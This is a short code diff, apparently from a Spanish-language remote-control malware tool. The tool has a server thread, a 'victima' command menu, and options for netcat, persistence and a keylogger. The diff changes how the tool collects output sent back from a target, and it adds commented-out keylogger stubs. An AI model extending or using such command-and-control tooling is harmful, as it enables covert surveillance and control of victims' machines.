@@ -167,22 +167,17 @@ class Server(Thread):
 
 
 	def recibir_todo(self,server):
-	
-		longitud = int(self.recibir(server))
 
-		data = []
+		completo = ""
 
 		while(True):
-			datos = self.recibir(server)
-			data.append(datos)
-			if (len(data)==longitud):
+			contenido = self.recibir(server,1024)
+			if (contenido=='ok'):
 				break
+			completo+=contenido
 
-		print('\n')
-		for _ in data:
-			print(_.rstrip('\n'))
-
-		print('\n')
+		print ("\n"+completo+"\n")
+	
 
 		return True
 
@@ -426,6 +421,10 @@ class Control():
 
 
 	def keylogger(self):
+		
+		#self.servidor.enviar(self.objetivo,"keylogger")
+		#msg = self.servidor.recibir(self.objetivo)
+		#print (msg)
 		return
 
 
@@ -729,6 +728,9 @@ def manipular(servidor,cliente):
 			banner_manipular()
 			control.netcat()
 			encabezados('manipular')
+
+		#elif (victima=="keylogger"):
+		#	control.keylogger()
 
 		elif (victima=="persistencia"):
 			control.persistencia()
